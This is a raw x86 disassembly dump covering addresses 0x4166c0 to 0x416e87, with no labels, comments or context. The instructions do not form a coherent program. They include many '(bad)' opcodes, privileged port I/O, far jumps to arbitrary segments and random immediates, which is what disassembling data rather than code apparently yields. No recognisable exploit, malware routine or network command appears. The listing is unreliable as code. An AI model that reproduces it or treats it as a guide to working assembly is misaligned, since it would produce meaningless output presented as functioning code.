  4166c0:	in     al,0x3
  4166c2:	test   BYTE PTR [edx],0xbd
  4166c5:	imul   edi
  4166c7:	shl    cl,0xb
  4166ca:	mul    BYTE PTR gs:[ebx]
  4166cd:	add    DWORD PTR [edi],0x5e6837bc
  4166d3:	repz clc 
  4166d5:	les    eax,FWORD PTR [edi]
  4166d7:	aad    0x70
  4166d9:	push   esi
  4166da:	sahf   
  4166db:	out    dx,al
  4166dc:	sbb    BYTE PTR [ebx],bh
  4166de:	adc    al,0x2e
  4166e0:	out    dx,al
  4166e1:	enter  0x77f4,0xc7
  4166e5:	add    DWORD PTR ds:0xac736703,ebp
  4166eb:	addr16 push ecx
  4166ed:	test   DWORD PTR [esi+0x4984d229],edx
  4166f3:	adc    ch,bh
  4166f5:	arpl   di,bp
  4166f7:	xor    al,0xa4
  4166f9:	popf   
  4166fa:	bswap  edx
  4166fc:	and    ch,BYTE PTR [edx-0x65]
  4166ff:	out    dx,al
  416700:	push   edi
  416701:	rcr    BYTE PTR [ebp+0x1b],cl
  416704:	sbb    cl,ch
  416706:	scas   al,BYTE PTR es:[edi]
  416707:	pop    ebx
  416708:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416709:	repnz shl BYTE PTR [esi-0x4ed4dce0],cl
  416710:	jb     0x4166ba
  416712:	push   0x8801e66d
  416717:	call   0xf7d7d1a3
  41671c:	mov    ch,BYTE PTR [esi-0x245432c1]
  416722:	push   ebp
  416723:	mov    ah,0x21
  416725:	clc    
  416726:	inc    ebp
  416727:	test   al,0x5a
  416729:	add    eax,0x6638a8b9
  41672e:	xchg   ebp,eax
  41672f:	and    dh,BYTE PTR [ecx-0x5e]
  416732:	sti    
  416733:	and    BYTE PTR [ecx-0x3ac3808d],bh
  416739:	mov    cl,0x43
  41673b:	cmp    eax,0xaaeb6d23
  416740:	push   ss
  416741:	fisub  DWORD PTR [eax+0x70cffd79]
  416747:	pusha  
  416748:	stos   DWORD PTR es:[edi],eax
  416749:	aaa    
  41674a:	in     al,0x41
  41674c:	sbb    al,0xd4
  41674e:	sahf   
  41674f:	and    edx,DWORD PTR [ecx+ebx*2+0x2977483d]
  416756:	and    BYTE PTR ds:0xa3890466,dh
  41675c:	mov    esp,DWORD PTR [esi-0x6558d647]
  416762:	dec    ebx
  416763:	xor    eax,0xbda861b9
  416768:	pop    es
  416769:	mov    eax,0xf334050b
  41676e:	jnp    0x416761
  416770:	std    
  416771:	retf   
  416772:	cdq    
  416773:	dec    ecx
  416774:	outs   dx,DWORD PTR ds:[esi]
  416775:	daa    
  416776:	pop    ds
  416777:	or     al,0xe8
  416779:	mov    WORD PTR [ebp-0x3d1962ee],ss
  41677f:	es mov edi,0xdbe6cbbc
  416785:	in     eax,dx
  416786:	sti    
  416787:	test   DWORD PTR [ecx+eax*1-0x1b],edi
  41678b:	push   esi
  41678c:	and    edx,DWORD PTR [ecx]
  41678e:	sub    dl,BYTE PTR [ecx+0xa06452b]
  416794:	jb     0x4167e2
  416796:	or     al,0x40
  416798:	inc    ecx
  416799:	and    DWORD PTR [ebp-0x53],ebx
  41679c:	cmp    ebx,eax
  41679e:	sbb    eax,DWORD PTR [edx+0x26e18b0e]
  4167a4:	mov    cl,0x30
  4167a6:	pop    esi
  4167a7:	xor    esp,DWORD PTR [edi-0x31]
  4167aa:	and    esi,ecx
  4167ac:	imul   BYTE PTR [ebx-0x18]
  4167af:	dec    ebp
  4167b0:	ja     0x41677f
  4167b2:	imul   esp,DWORD PTR [edx-0x72],0xd959c67c
  4167b9:	and    al,BYTE PTR [ecx-0x5b]
  4167bc:	ds dec ebx
  4167be:	std    
  4167bf:	shl    BYTE PTR fs:[ecx],cl
  4167c2:	dec    esp
  4167c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167c4:	arpl   WORD PTR [eax+0x1751e2e1],sp
  4167ca:	sub    BYTE PTR [ebx-0x362e5e99],ah
  4167d0:	stc    
  4167d1:	push   ebx
  4167d2:	ret    
  4167d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167d4:	(bad)  
  4167d5:	out    0xfd,eax
  4167d7:	xor    DWORD PTR [esi],esi
  4167d9:	icebp  
  4167da:	pop    ecx
  4167db:	dec    ebp
  4167dc:	add    bh,al
  4167de:	fcom   QWORD PTR ds:0x7223ffe1
  4167e4:	dec    edx
  4167e5:	mov    esp,0x48e4cf72
  4167ea:	xchg   ebx,eax
  4167eb:	mov    al,0x1e
  4167ed:	jge    0x4167b0
  4167ef:	retf   0xd6cf
  4167f2:	sub    al,0xd
  4167f4:	sub    bl,BYTE PTR [esi]
  4167f6:	sbb    al,0x31
  4167f8:	push   0xffffffa6
  4167fa:	adc    DWORD PTR [esi],0xffffff84
  4167fd:	not    cl
  4167ff:	push   eax
  416800:	ds jge 0x416861
  416803:	push   ebx
  416804:	adc    ebp,esi
  416806:	ss xchg esi,eax
  416808:	push   edx
  416809:	mov    ch,0x18
  41680b:	mov    WORD PTR [ebp-0x7be5e17c],es
  416811:	sub    ch,ch
  416813:	les    esp,FWORD PTR [esi+0x9]
  416816:	dec    esp
  416817:	xchg   esp,eax
  416818:	dec    esi
  416819:	out    0xdb,eax
  41681b:	xchg   edi,eax
  41681c:	fidivr WORD PTR [esi+0x6cac986c]
  416822:	xchg   edx,eax
  416823:	nop
  416824:	por    mm6,mm6
  416827:	arpl   WORD PTR [ebp-0x3c],dx
  41682a:	jb     0x41680c
  41682c:	mov    ds:0x304c4ac,al
  416831:	and    ch,BYTE PTR [edx]
  416833:	lods   eax,DWORD PTR ds:[esi]
  416834:	aad    0x67
  416836:	(bad)  
  416837:	and    BYTE PTR ds:0xa633e10e,cl
  41683d:	mov    bh,0x7e
  41683f:	xchg   edx,eax
  416840:	cld    
  416841:	inc    edi
  416842:	fbld   TBYTE PTR [eax-0x70]
  416845:	or     edx,ecx
  416847:	mov    BYTE PTR [edi],ah
  416849:	push   0xffffffed
  41684b:	sub    al,0x72
  41684d:	jno    0x416857
  41684f:	idiv   BYTE PTR [ebx-0x70]
  416852:	inc    eax
  416853:	xor    BYTE PTR [edi+0x5021ee2],ch
  416859:	or     BYTE PTR [ebx],cl
  41685b:	stos   DWORD PTR es:[edi],eax
  41685c:	jp     0x416892
  41685e:	cmc    
  41685f:	sar    DWORD PTR [ebp-0x7a6973a2],1
  416865:	out    0x80,al
  416867:	aam    0x4c
  416869:	pop    ds
  41686a:	arpl   WORD PTR [edi+0x1f],di
  41686d:	es daa 
  41686f:	cdq    
  416870:	push   0x57
  416872:	and    eax,0x55fda9f
  416877:	iret   
  416878:	sbb    BYTE PTR es:[ebp+0x67b9c13b],cl
  41687f:	rcr    bh,0x88
  416882:	sbb    eax,0xce58dd15
  416887:	jmp    FWORD PTR [esi-0x37db6b87]
  41688d:	mov    ds:0x49e49a7f,al
  416892:	rcr    DWORD PTR [ecx-0x75e43238],cl
  416898:	push   ss
  416899:	xchg   ebx,eax
  41689a:	rcr    DWORD PTR [ecx+0x6a],0x6b
  41689e:	ss ret 0x782b
  4168a2:	push   edx
  4168a3:	pop    ebp
  4168a4:	mov    eax,ds:0x6d430c1b
  4168a9:	adc    eax,0x6c7df494
  4168ae:	mov    eax,0x8d288d5a
  4168b3:	int3   
  4168b4:	jp     0x41691b
  4168b6:	xor    bh,cl
  4168b8:	push   0xdf2b55a0
  4168bd:	hlt    
  4168be:	push   ss
  4168bf:	stos   BYTE PTR es:[edi],al
  4168c0:	mov    ds:0x2494dfa5,al
  4168c5:	hlt    
  4168c6:	icebp  
  4168c7:	iret   
  4168c8:	(bad)  
  4168c9:	hlt    
  4168ca:	and    BYTE PTR [edx+ebx*4+0x6e8630b4],bh
  4168d1:	jp     0x416922
  4168d3:	jo     0x41690a
  4168d5:	mov    eax,0xc4fddf78
  4168da:	mov    bh,0x9b
  4168dc:	movups xmm4,XMMWORD PTR [ebx+0x173690bd]
  4168e3:	jno    0x4168cf
  4168e5:	dec    ebx
  4168e6:	rcr    esp,1
  4168e8:	dec    ebp
  4168e9:	rcr    BYTE PTR fs:[eax+0x59],1
  4168ed:	pop    ebx
  4168ee:	(bad)  
  4168ef:	or     al,0x6
  4168f1:	pop    eax
  4168f2:	jecxz  0x4168b9
  4168f4:	aas    
  4168f5:	test   eax,0x2a4b6d7f
  4168fa:	add    DWORD PTR [esp+eax*8+0x2d],edi
  4168fe:	xor    al,0x31
  416900:	add    ah,BYTE PTR [edx-0x43]
  416903:	dec    ebx
  416904:	sub    BYTE PTR [ebx+edx*1],ah
  416907:	xor    al,0x54
  416909:	cmc    
  41690a:	xor    eax,0x2b0d6f3a
  41690f:	fist   WORD PTR [ebp-0x3477a3be]
  416915:	dec    eax
  416916:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416917:	cmp    dh,BYTE PTR [ebx-0x175e3c89]
  41691d:	push   edx
  41691e:	xchg   edx,eax
  41691f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416920:	(bad)  
  416921:	fiadd  DWORD PTR [eax-0x7ab98f58]
  416927:	xlat   BYTE PTR ds:[ebx]
  416928:	in     al,0x96
  41692a:	cld    
  41692b:	push   esi
  41692c:	fbld   TBYTE PTR [eax-0x77]
  41692f:	jns    0x4168be
  416931:	sbb    ebx,DWORD PTR [eax+0x44]
  416934:	push   eax
  416935:	(bad)  
  416936:	adc    ebx,ebx
  416938:	mov    ebp,0x494f4444
  41693d:	adc    al,BYTE PTR [eax]
  41693f:	mov    ch,0xce
  416941:	hlt    
  416942:	xlat   BYTE PTR ds:[ebx]
  416943:	dec    ebp
  416944:	jle    0x41698a
  416946:	fyl2xp1 
  416948:	int3   
  416949:	rol    BYTE PTR [ebp-0x2ef7be62],0x50
  416950:	sub    ch,dh
  416952:	test   BYTE PTR [ebx+0x68285f2f],al
  416958:	jg     0x416916
  41695a:	shl    BYTE PTR [eax],cl
  41695c:	mov    bh,0x63
  41695e:	xchg   DWORD PTR [ecx-0x79dd8cb3],edi
  416964:	retf   0x30cc
  416967:	(bad)  
  416968:	out    dx,al
  416969:	sbb    eax,0x29d85e98
  41696e:	adc    bl,BYTE PTR [ecx+0x5a]
  416971:	fcmovnu st,st(7)
  416973:	pop    edx
  416974:	xor    al,0x57
  416976:	sub    eax,0x36dfa23a
  41697b:	mov    ebx,0xc126fe27
  416980:	fcmovnbe st,st(0)
  416982:	xchg   ebx,eax
  416983:	xchg   edi,eax
  416984:	mov    ebp,0x64f1dc15
  416989:	xchg   edx,eax
  41698a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41698b:	hlt    
  41698c:	lock es push ss
  41698f:	call   0x16aa0dd1
  416994:	jp     0x4169a7
  416996:	cmc    
  416997:	rcr    DWORD PTR [ebx-0x75e166f1],1
  41699d:	dec    ecx
  41699e:	and    dh,ch
  4169a0:	(bad)  
  4169a1:	mov    bl,0x1
  4169a3:	push   edx
  4169a4:	adc    eax,0xf0ce39b9
  4169a9:	push   edi
  4169aa:	jecxz  0x416973
  4169ac:	mov    bl,0xd9
  4169ae:	stos   DWORD PTR es:[edi],eax
  4169af:	pop    edi
  4169b0:	sahf   
  4169b1:	in     al,0xe6
  4169b3:	call   0x60cf:0x36c92d74
  4169ba:	fimul  DWORD PTR [esi+0x3]
  4169bd:	jg     0x416a28
  4169bf:	xor    cl,BYTE PTR ds:0x29e9bd1b
  4169c5:	dec    edi
  4169c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169c7:	push   0xd1052f59
  4169cc:	dec    ecx
  4169cd:	xchg   ebx,eax
  4169ce:	mov    esi,0x3f5d1cc3
  4169d3:	(bad)  
  4169d4:	loopne 0x416a1d
  4169d6:	inc    ebx
  4169d7:	or     dh,BYTE PTR [ecx*8-0x6fa871d4]
  4169de:	push   edi
  4169df:	sub    eax,0x1ba9f805
  4169e4:	adc    DWORD PTR [eax+esi*2-0x16],0xffffffd4
  4169e9:	adc    dl,dl
  4169eb:	jmp    0x3450b9d5
  4169f0:	shl    DWORD PTR [ebx+ebx*8+0x5e],cl
  4169f4:	iret   
  4169f5:	xor    eax,0xe70ea9f3
  4169fa:	mov    edx,0xe0998401
  4169ff:	push   0xe8eaceab
  416a04:	adc    ah,BYTE PTR [eax]
  416a06:	push   ss
  416a07:	xchg   ecx,eax
  416a08:	int3   
  416a09:	popf   
  416a0a:	inc    edi
  416a0b:	dec    edi
  416a0c:	push   edi
  416a0d:	imul   edx,DWORD PTR [edi+eiz*4],0xcce8f76d
  416a14:	jnp    0x4169d9
  416a16:	xchg   ebp,eax
  416a17:	fldenv [edi+0x6fbd8bc6]
  416a1d:	ret    
  416a1e:	add    DWORD PTR [edx],ecx
  416a20:	retf   
  416a21:	mov    bh,0xaa
  416a23:	stc    
  416a24:	jo     0x416a9b
  416a26:	and    eax,0xef029919
  416a2b:	mov    cl,BYTE PTR [edx]
  416a2d:	(bad)  
  416a2f:	jge    0x416a9e
  416a31:	push   esi
  416a32:	dec    ecx
  416a33:	(bad)  
  416a34:	sti    
  416a35:	mov    ch,0xe6
  416a37:	inc    eax
  416a38:	and    eax,0x976bdd3c
  416a3d:	or     edx,DWORD PTR [edx+0x3115507e]
  416a43:	mov    eax,0x56aa844d
  416a48:	cmp    al,0xb2
  416a4a:	sub    DWORD PTR [edi],0xffffffbc
  416a4d:	jecxz  0x4169ed
  416a4f:	cdq    
  416a50:	inc    ecx
  416a51:	les    edx,FWORD PTR [edi]
  416a53:	fisttp QWORD PTR ds:[ebp+0x15]
  416a57:	inc    esp
  416a58:	aaa    
  416a59:	sub    eax,0x8afac4c3
  416a5e:	cs pop esi
  416a60:	out    0xfa,eax
  416a62:	pop    esi
  416a63:	js     0x4169e6
  416a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a66:	push   ecx
  416a67:	(bad)  [esi]
  416a69:	cs js  0x416a01
  416a6c:	mov    BYTE PTR [ebp-0x4c04d3f9],bl
  416a72:	iret   
  416a73:	sar    ecx,1
  416a75:	mov    edx,0x589760cc
  416a7a:	jmp    0x416af5
  416a7c:	push   esp
  416a7d:	(bad)  
  416a7f:	std    
  416a80:	test   al,0xa
  416a82:	int3   
  416a83:	(bad)  
  416a84:	pop    ebp
  416a85:	xor    DWORD PTR [edx-0x2f8cf8c2],ebp
  416a8b:	push   edi
  416a8c:	xchg   esi,eax
  416a8d:	(bad)  
  416a8e:	stc    
  416a8f:	f2xm1  
  416a91:	(bad)  
  416a92:	clc    
  416a93:	mov    bl,0x9c
  416a95:	and    al,0x1f
  416a97:	push   0x3ddf6f01
  416a9c:	jb     0x416ae0
  416a9e:	shr    DWORD PTR cs:[esi+0x7a],cl
  416aa2:	inc    esi
  416aa3:	mov    cl,0x89
  416aa5:	aaa    
  416aa6:	adc    al,0x72
  416aa8:	das    
  416aa9:	dec    ebx
  416aaa:	xchg   ebp,eax
  416aab:	push   ss
  416aac:	jbe    0x416abe
  416aae:	lahf   
  416aaf:	push   eax
  416ab0:	test   BYTE PTR [esi],0xe5
  416ab3:	xchg   ecx,eax
  416ab4:	gs xchg ebx,eax
  416ab6:	mov    cl,0x49
  416ab8:	test   BYTE PTR [edx-0x65bb5d3d],0x8a
  416abf:	pop    ecx
  416ac0:	push   ebx
  416ac1:	loopne 0x416a87
  416ac3:	aam    0xfc
  416ac5:	cwde   
  416ac6:	int    0xa5
  416ac8:	mov    edi,0x3b8b2697
  416acd:	inc    esp
  416ace:	ss aad 0x2f
  416ad1:	cbw    
  416ad3:	ss mov cl,0xdd
  416ad6:	ret    0x7e02
  416ad9:	adc    DWORD PTR gs:[ebx+0xa],edi
  416add:	sub    BYTE PTR [ecx-0x42],ch
  416ae0:	sbb    dl,dl
  416ae2:	xchg   ebp,eax
  416ae3:	test   al,0x1c
  416ae5:	push   edx
  416ae6:	dec    ebx
  416ae7:	jl     0x416b13
  416ae9:	stos   BYTE PTR es:[edi],al
  416aea:	jle    0x416a6f
  416aec:	retf   0x73a0
  416aef:	aaa    
  416af0:	int    0xc2
  416af2:	jp     0x416b29
  416af4:	out    0x5,al
  416af6:	mov    al,ds:0x53dc4ba9
  416afb:	push   edi
  416afc:	icebp  
  416afd:	call   0x3754:0x26297b8a
  416b04:	jbe    0x416b38
  416b06:	dec    esi
  416b07:	pusha  
  416b08:	cmp    eax,0x6128f1c1
  416b0d:	repz std 
  416b0f:	je     0x416b05
  416b11:	dec    ebp
  416b12:	add    BYTE PTR [edx+edx*8],bh
  416b15:	dec    esi
  416b16:	mov    ds:0x113e6955,eax
  416b1b:	lock adc eax,0xeeed07b9
  416b21:	dec    ebx
  416b22:	push   edx
  416b23:	add    ah,BYTE PTR [ebx]
  416b25:	push   cs
  416b26:	sbb    ecx,DWORD PTR [edi]
  416b28:	sub    esi,DWORD PTR [edi-0x9]
  416b2b:	test   ch,bl
  416b2d:	dec    ebp
  416b2e:	cld    
  416b2f:	mov    ch,BYTE PTR [edx]
  416b31:	rol    DWORD PTR [edi+0x242cc9ca],0xcb
  416b38:	jne    0x416ad9
  416b3a:	mov    ah,0x43
  416b3c:	or     al,0x87
  416b3e:	xchg   ebx,eax
  416b3f:	and    esp,DWORD PTR [esi+eax*4]
  416b42:	gs rol cl,0x7a
  416b46:	jnp    0x416b96
  416b48:	push   es
  416b49:	push   esp
  416b4a:	sbb    DWORD PTR [ecx-0x3b24a61e],esp
  416b50:	lahf   
  416b51:	popf   
  416b52:	lds    esi,FWORD PTR [ebx+0x68]
  416b55:	adc    BYTE PTR [esp+esi*1],al
  416b58:	xlat   BYTE PTR ds:[ebx]
  416b59:	fcomp  st(2)
  416b5b:	adc    BYTE PTR [ebp+0x26],0xb2
  416b5f:	(bad)  
  416b60:	mov    edi,0x1eb229bb
  416b65:	mov    ebp,0xba8a6481
  416b6a:	mov    cl,bh
  416b6c:	or     eax,0xc1aca45b
  416b71:	mov    ds:0x18e57fe1,al
  416b76:	pop    ebx
  416b77:	pop    edi
  416b78:	inc    edi
  416b79:	jg     0x416b27
  416b7b:	cld    
  416b7c:	iret   
  416b7d:	xor    al,0x17
  416b80:	push   edi
  416b81:	loopne 0x416b10
  416b83:	sbb    edi,ebp
  416b85:	leave  
  416b86:	sub    al,0x9d
  416b88:	mov    ds:0x8f92667a,al
  416b8d:	inc    ecx
  416b8e:	xor    cl,dh
  416b90:	adc    ah,BYTE PTR [eax-0x1c]
  416b93:	enter  0x9fef,0x59
  416b97:	scas   eax,DWORD PTR es:[edi]
  416b98:	adc    al,bh
  416b9a:	ret    0xf864
  416b9d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b9e:	or     ebp,DWORD PTR [eax-0x7]
  416ba1:	stc    
  416ba2:	repnz xlat BYTE PTR ds:[ebx]
  416ba4:	fnstenv [edi+ecx*4-0x329a4c39]
  416bab:	or     ch,BYTE PTR [edi-0x57]
  416bae:	dec    ebx
  416baf:	in     al,dx
  416bb0:	cmp    ch,BYTE PTR [ebx+0x14]
  416bb3:	or     dl,BYTE PTR [eax-0x5b]
  416bb6:	(bad)  
  416bb7:	push   ds
  416bb8:	cmc    
  416bb9:	fdiv   st,st(4)
  416bbb:	loop   0x416c07
  416bbd:	out    0x52,eax
  416bbf:	inc    ebx
  416bc0:	scas   eax,DWORD PTR es:[edi]
  416bc1:	sbb    ecx,DWORD PTR [eax-0x391398af]
  416bc7:	mov    eax,ds:0xd2827ad
  416bcc:	ins    DWORD PTR es:[edi],dx
  416bcd:	cmp    BYTE PTR [ebx-0x5ce96777],0x6d
  416bd4:	jmp    0xe443:0x7f8f726d
  416bdb:	dec    esi
  416bdc:	sbb    eax,esp
  416bde:	fistp  QWORD PTR [edx-0x22792a01]
  416be4:	add    dl,bl
  416be6:	cli    
  416be7:	sub    DWORD PTR [ecx+0x7d91aec5],0x43
  416bee:	cmc    
  416bef:	jnp    0x416b79
  416bf1:	jns    0x416b9a
  416bf3:	xchg   al,cl
  416bf5:	mov    ecx,0xde146dec
  416bfa:	xchg   ah,cl
  416bfc:	fwait
  416bfd:	adc    BYTE PTR [eax+0x2d],0x23
  416c01:	adc    al,0x51
  416c03:	in     eax,0xea
  416c05:	jbe    0x416be9
  416c07:	ret    0xb2ec
  416c0a:	rol    BYTE PTR [esi],0x54
  416c0d:	loop   0x416c73
  416c0f:	mov    esp,0xc87234a6
  416c14:	stos   DWORD PTR es:[edi],eax
  416c15:	inc    esi
  416c16:	and    DWORD PTR gs:[ebx],edi
  416c19:	addr16 sahf 
  416c1b:	mov    ch,0x19
  416c1d:	pop    ebp
  416c1e:	cs push ebp
  416c20:	mov    al,ds:0x28657c34
  416c25:	cwde   
  416c26:	mov    cl,0x13
  416c28:	mov    cl,0xd4
  416c2a:	add    eax,DWORD PTR [edx-0x3f50a503]
  416c30:	js     0x416c03
  416c32:	or     eax,0x6b6e41fc
  416c37:	aas    
  416c38:	stc    
  416c39:	sbb    al,0x9
  416c3b:	sbb    eax,0x9c129c74
  416c40:	ficomp WORD PTR [ebx]
  416c42:	mul    BYTE PTR [ebx-0x6df2f901]
  416c48:	push   esi
  416c49:	pop    edi
  416c4a:	xor    eax,0xf2fa5e3c
  416c4f:	cld    
  416c50:	push   ss
  416c51:	and    eax,0x3afe114b
  416c56:	inc    ebp
  416c57:	xchg   esi,eax
  416c58:	outs   dx,BYTE PTR ds:[esi]
  416c59:	je     0x416c80
  416c5b:	(bad)  
  416c5c:	(bad)  
  416c5d:	mov    bl,al
  416c5f:	les    edi,FWORD PTR [ebx+0x3b]
  416c62:	inc    eax
  416c63:	cld    
  416c64:	mov    dl,0xd4
  416c66:	or     DWORD PTR [ebx+ecx*2-0x1a9a7779],eax
  416c6d:	xchg   edi,eax
  416c6e:	repz fs push ebx
  416c71:	mov    ds:0xd58ae585,eax
  416c76:	xor    BYTE PTR [edi+eax*8],0xbd
  416c7a:	pushf  
  416c7b:	lds    eax,FWORD PTR [edx+esi*8]
  416c7e:	push   edx
  416c7f:	push   ecx
  416c80:	rol    DWORD PTR [edx+edi*4-0x9],cl
  416c84:	iret   
  416c85:	push   0xffffffeb
  416c87:	xchg   ecx,eax
  416c88:	xor    eax,DWORD PTR ds:0x361d4fba
  416c8e:	test   eax,0x6b8971a9
  416c93:	and    al,0x49
  416c95:	and    al,0xa8
  416c97:	(bad)  
  416c98:	ror    DWORD PTR [ebx+0x3f6bee01],1
  416c9e:	je     0x416c2a
  416ca0:	aad    0x83
  416ca2:	hlt    
  416ca3:	cmpxchg BYTE PTR [edi-0xf],dl
  416ca7:	arpl   ax,bp
  416ca9:	jns    0x416c48
  416cab:	sub    al,0x11
  416cad:	jo     0x416cb9
  416caf:	push   ss
  416cb0:	jno    0x416c82
  416cb2:	cmp    al,0x5d
  416cb4:	cmp    al,0xdb
  416cb6:	mul    BYTE PTR [edx]
  416cb8:	xchg   esp,eax
  416cb9:	(bad)  
  416cba:	(bad)  [esi+eiz*8]
  416cbd:	icebp  
  416cbe:	cmp    bl,dh
  416cc0:	jbe    0x416cef
  416cc2:	or     eax,0xdf1b1eae
  416cc7:	adc    dl,BYTE PTR [edx+0x33a6c12a]
  416ccd:	adc    edx,DWORD PTR [esi-0x76]
  416cd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416cd1:	ds dec ecx
  416cd3:	cmc    
  416cd4:	mov    DWORD PTR ds:0xf45d6ddd,edx
  416cda:	stos   DWORD PTR es:[edi],eax
  416cdb:	sub    al,0xa0
  416cdd:	shr    DWORD PTR [edi+ebp*8-0x41a939f8],cl
  416ce4:	pop    ebx
  416ce5:	fwait
  416ce6:	jo     0x416d4f
  416ce8:	aad    0x2b
  416cea:	clc    
  416ceb:	scas   eax,DWORD PTR es:[edi]
  416cec:	push   esi
  416ced:	jle    0x416cc4
  416cef:	dec    ecx
  416cf0:	push   esp
  416cf1:	imul   edx,DWORD PTR [edi],0xf29c913a
  416cf7:	push   ds
  416cf8:	or     edi,eax
  416cfa:	ja     0x416cb2
  416cfc:	mov    cl,0x4c
  416cfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cff:	rcl    DWORD PTR [edx-0x69],1
  416d02:	pop    ebp
  416d03:	(bad)  
  416d04:	xchg   ebx,eax
  416d05:	in     al,dx
  416d06:	pop    edx
  416d07:	mov    cl,0x18
  416d09:	add    al,0xc9
  416d0b:	push   es
  416d0c:	push   esi
  416d0d:	ins    DWORD PTR es:[edi],dx
  416d0e:	retf   
  416d0f:	xor    DWORD PTR [eax+0x7df7d6a1],ecx
  416d15:	push   ss
  416d16:	sbb    dl,dh
  416d18:	cmovae ebp,DWORD PTR [edi]
  416d1b:	pop    ecx
  416d1c:	and    DWORD PTR ds:0xa10af7c1,ebp
  416d22:	cmp    DWORD PTR [bp+di],0x7a9a465
  416d29:	and    bh,cl
  416d2b:	int    0x11
  416d2d:	jp     0x416cf2
  416d2f:	add    edx,DWORD PTR [eax]
  416d31:	dec    ecx
  416d32:	add    ebp,DWORD PTR [edx-0x6f33da46]
  416d38:	ds js  0x416cfe
  416d3b:	out    dx,al
  416d3c:	js     0x416d68
  416d3e:	loopne 0x416d7d
  416d40:	xchg   edi,eax
  416d41:	loope  0x416cc4
  416d43:	stos   DWORD PTR es:[edi],eax
  416d44:	mov    ch,0xf8
  416d46:	retf   
  416d47:	jp     0x416d1b
  416d49:	out    dx,eax
  416d4a:	(bad)  
  416d4b:	sbb    edx,DWORD PTR [edi]
  416d4d:	mov    ds:0xfcc996b6,eax
  416d52:	jmp    0x129:0x727db8ca
  416d59:	mov    esi,0x76cc084e
  416d5e:	in     eax,0x0
  416d60:	and    DWORD PTR [ebp+0x51],edx
  416d63:	outs   dx,DWORD PTR ds:[esi]
  416d64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d65:	call   0xb22e55de
  416d6a:	pop    ebx
  416d6b:	add    ebp,DWORD PTR [ecx-0x17]
  416d6e:	mov    DWORD PTR [ebp-0x37],0x9085a0f6
  416d75:	push   eax
  416d76:	push   esi
  416d77:	fwait
  416d78:	popf   
  416d79:	shl    al,cl
  416d7b:	hlt    
  416d7c:	addr16 in eax,0xf2
  416d7f:	idiv   DWORD PTR [edi-0x5e456bf9]
  416d85:	daa    
  416d86:	sbb    eax,esi
  416d88:	mul    ebp
  416d8a:	shl    BYTE PTR [ecx-0xd],cl
  416d8d:	cli    
  416d8e:	rcr    bl,1
  416d90:	cmc    
  416d91:	loope  0x416d34
  416d93:	lahf   
  416d94:	cli    
  416d95:	or     eax,0xafe38390
  416d9a:	call   0x7243b352
  416d9f:	cmp    DWORD PTR [ebp+0x3],ebp
  416da2:	iret   
  416da3:	add    ah,BYTE PTR [ecx+0x715d9ad8]
  416da9:	(bad)  
  416dab:	stos   DWORD PTR es:[edi],eax
  416dac:	mov    ds:0x46d18df3,al
  416db1:	or     BYTE PTR [ebx],cl
  416db3:	popfw  
  416db5:	jecxz  0x416d6a
  416db7:	nop
  416db8:	pop    edx
  416db9:	not    BYTE PTR [edx-0x6f44672e]
  416dbf:	ficom  DWORD PTR [esi+0x556a880]
  416dc5:	(bad)  
  416dc7:	mov    bl,0xe9
  416dc9:	adc    DWORD PTR ds:0x3b05ec77,esp
  416dcf:	aam    0xea
  416dd1:	(bad)
  416dd4:	jecxz  0x416d7d
  416dd6:	sub    DWORD PTR [ecx-0x64993805],esi
  416ddc:	in     eax,0xba
  416dde:	lods   eax,DWORD PTR ds:[esi]
  416ddf:	xlat   BYTE PTR ds:[ebx]
  416de0:	mov    edi,0x8c2d4d8e
  416de5:	cmp    bh,BYTE PTR cs:[esi]
  416de8:	mov    edi,0xc9dcabb
  416ded:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dee:	sub    ecx,0xffffff92
  416df1:	xchg   esp,eax
  416df2:	aam    0xa
  416df4:	clc    
  416df5:	add    eax,0x5df037b3
  416dfa:	push   edi
  416dfb:	mov    ebp,DWORD PTR [ebx-0x40eda35a]
  416e01:	pop    eax
  416e02:	inc    eax
  416e03:	mov    eax,0x59e98643
  416e08:	pusha  
  416e09:	mov    ebp,0x57a49d0b
  416e0e:	sti    
  416e0f:	imul   esi,DWORD PTR [esi+0x7a971e49],0xffffffda
  416e16:	jnp    0x416e71
  416e18:	pop    es
  416e19:	mov    ds:0x35865546,eax
  416e1e:	cli    
  416e1f:	sbb    al,0x68
  416e21:	int3   
  416e22:	adc    al,0x1c
  416e24:	cmp    DWORD PTR [ecx-0x31],ebp
  416e27:	arpl   bp,bx
  416e29:	adc    al,0x4
  416e2b:	mov    cl,0x45
  416e2d:	std    
  416e2e:	(bad)
  416e31:	daa    
  416e32:	mov    esi,0xea3ee943
  416e37:	in     al,dx
  416e38:	jo     0x416e2f
  416e3a:	out    dx,al
  416e3b:	loop   0x416e02
  416e3d:	mov    edi,0x99f24a7b
  416e42:	(bad)  
  416e43:	std    
  416e44:	sbb    eax,0x19be3420
  416e49:	fbld   TBYTE PTR ds:0x29624cb5
  416e4f:	std    
  416e50:	sub    BYTE PTR [ebx-0x34418191],ah
  416e56:	and    esi,DWORD PTR [esi+0x62]
  416e59:	cwde   
  416e5a:	mov    al,ds:0x46fcef78
  416e5f:	das    
  416e60:	push   ecx
  416e61:	imul   edi,DWORD PTR [ebp+0x8aef564],0x3f
  416e68:	push   ecx
  416e69:	fild   QWORD PTR ds:0x642aa7c2
  416e6f:	or     bl,BYTE PTR [edx-0x17]
  416e72:	lahf   
  416e73:	sub    DWORD PTR [ecx],ecx
  416e75:	js     0x416eb1
  416e77:	retf   0x3e99
  416e7a:	jne    0x416eb5
  416e7c:	aas    
  416e7d:	sbb    ah,cl
  416e7f:	mov    esi,0xff35ea9
  416e84:	or     BYTE PTR [ecx],0x2a
  416e87:	xor    eax,0x29c77d0a
